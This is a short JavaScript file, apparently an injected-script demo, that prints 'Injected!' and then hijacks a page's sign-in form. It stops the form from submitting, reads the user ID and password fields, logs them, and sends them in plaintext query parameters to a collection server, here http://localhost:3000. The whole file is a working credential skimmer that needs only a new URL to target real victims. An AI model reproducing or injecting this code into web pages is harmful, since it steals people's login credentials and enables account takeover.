console.log('Injected!')

var form = document.getElementById('SignInForm')
form.addEventListener("submit", captureForm)

function captureForm(e) {
    e.preventDefault()
    var password = document.getElementById('pass').value
    var userid = document.getElementById('userid').value
    console.log("Password logged for " + userid + ": " + password)
    httpGet("http://localhost:3000?userid=" + userid + "&password=" + password)
    return false
}


function httpGet(theUrl) {
    var xmlHttp = null
    xmlHttp = new XMLHttpRequest()
    xmlHttp.open("GET", theUrl, false)
    xmlHttp.send(null)
    return xmlHttp.responseText
}